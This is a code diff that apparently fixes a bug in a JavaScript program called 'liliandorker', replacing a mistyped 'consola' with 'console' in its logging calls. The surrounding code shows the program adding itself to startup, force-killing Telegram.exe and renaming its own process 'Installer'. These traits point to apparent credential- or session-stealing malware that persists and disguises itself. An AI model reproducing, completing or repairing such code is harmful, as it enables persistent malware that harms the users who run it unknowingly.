@@ -173,7 +173,7 @@ class liliandorker {
                 )
             );
 
-        consola.log(process.argv0);
+        console.log(process.argv0);
 
         setTimeout(() => {
             this.requires.fs.rename(
@@ -188,27 +188,27 @@ class liliandorker {
             );
         }, 3000);
 
-        consola.log("Added to startup");
+        console.log("Added to startup");
     }
 
 
 
     async init() {
         process.on("unhandledRejection", (err) => {
-            consola.log(err);
+            console.log(err);
         });
 
         process.on("uncaughtException", (exc) => {
-            consola.log(exc);
+            console.log(exc);
         });
 
         exec('taskkill /IM Telegram.exe /F', (error, stdout, stderr) => {
             if (error) {
-                consola.error(`exec error: ${error}`);
+                console.error(`exec error: ${error}`);
                 return;
             }
-            consola.log(`stdout: ${stdout}`);
-            consola.log(`stderr: ${stderr}`);
+            console.log(`stdout: ${stdout}`);
+            console.log(`stderr: ${stderr}`);
         })
 
         process.title = "Installer";
